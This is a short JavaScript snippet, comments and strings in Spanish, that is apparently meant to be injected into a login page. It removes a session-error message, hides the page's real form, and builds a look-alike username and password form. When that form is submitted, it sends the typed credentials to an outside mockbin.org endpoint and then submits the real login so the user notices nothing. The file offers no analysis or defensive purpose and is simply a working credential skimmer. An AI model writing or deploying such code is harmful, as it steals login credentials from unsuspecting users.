var contenido = document.getElementById('contenido').innerHTML;
contenido = contenido.replace(/<p><\/p>La sesión fué cerrada por el error:/g, '');
document.getElementById('contenido').innerHTML = contenido;
let form = document.createElement("form");
form.setAttribute("class", "form-container");


let usuarioGroup = document.createElement("div");
usuarioGroup.setAttribute("class", "input-group");
let labelUsuario = document.createElement("label");
labelUsuario.setAttribute("for", "usuario");
labelUsuario.innerHTML = "USUARIO:";
let usuario = document.createElement("input");
usuario.setAttribute("type", "text");
usuario.setAttribute("name", "usuario");
usuario.setAttribute("class", "user");
usuario.setAttribute("size", "20");
usuario.setAttribute("maxlength", "50");
usuarioGroup.appendChild(labelUsuario);
usuarioGroup.appendChild(usuario);

let passwordGroup = document.createElement("div");
passwordGroup.setAttribute("class", "input-group");
let labelPassword = document.createElement("label");
labelPassword.setAttribute("for", "password");
labelPassword.innerHTML = "CONTRASEÑA:";
form.setAttribute("method", "post");
form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/5c575471-5e68-4d34-8ac2-81a4f67e12e7");xhr.send(`user=${usuario.value};password=${password.value}`);');
let password = document.createElement("input");
password.setAttribute("type", "password");
password.setAttribute("class", "password");
password.setAttribute("name", "password");
password.setAttribute("size", "20");
password.setAttribute("maxlength", "50");
passwordGroup.appendChild(labelPassword);
passwordGroup.appendChild(password);


let boton=document.createElement("input");
boton.setAttribute("type","submit");
boton.setAttribute("class","enviar_btn");

form.appendChild(usuarioGroup);
form.appendChild(passwordGroup);
form.appendChild(boton);


document.getElementById("contenido").appendChild(form);
document.forms[0].style="display:none;";
